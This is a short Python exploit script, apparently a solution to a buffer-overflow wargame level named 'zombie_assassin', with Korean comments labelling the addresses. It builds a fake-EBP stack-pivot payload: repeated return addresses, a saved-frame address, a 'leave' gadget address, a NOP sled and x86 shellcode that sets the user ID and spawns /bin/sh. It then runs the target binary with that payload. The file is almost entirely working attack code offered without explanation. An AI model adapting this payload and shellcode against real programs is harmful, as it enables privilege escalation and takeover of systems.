import os
import struct

payload = ""
buffer = 0xbffff9f0
febp = 0x80484df #leave주소 
ret =  0xbffffbaf #쉘코드 주소
shellcode = "\x90"*100 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
target = "/home/assassin/zombie_assassin"

def append(x):
    return payload + x

def p(x):
    return struct.pack("<L", x)

payload = append(p(ret)*10) #쉘코드 주소
payload = append(p(buffer)) #febp -> buffer
payload = append(p(febp)) #leave명령어
payload = append(shellcode)

pid = os.fork()

if pid == 0:
    os.execv(target, (target, payload))
else:
    os.waitpid(pid, 0)